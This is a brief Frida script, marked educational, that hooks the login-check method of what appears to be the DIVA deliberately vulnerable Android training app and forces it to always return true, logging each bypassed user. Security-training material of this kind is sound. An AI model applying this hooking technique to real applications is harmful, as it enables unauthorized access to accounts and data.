// bypass_login.js - Example Frida script (educational)
Java.perform(function() {
    try {
        var Login = Java.use("com.payatu.diva.activities.LoginActivity");
        Login.verifyCredentials.implementation = function(u,p) {
            console.log("[*] bypassed login for " + u);
            return true;
        };
    } catch (e) { console.log(e); }
});
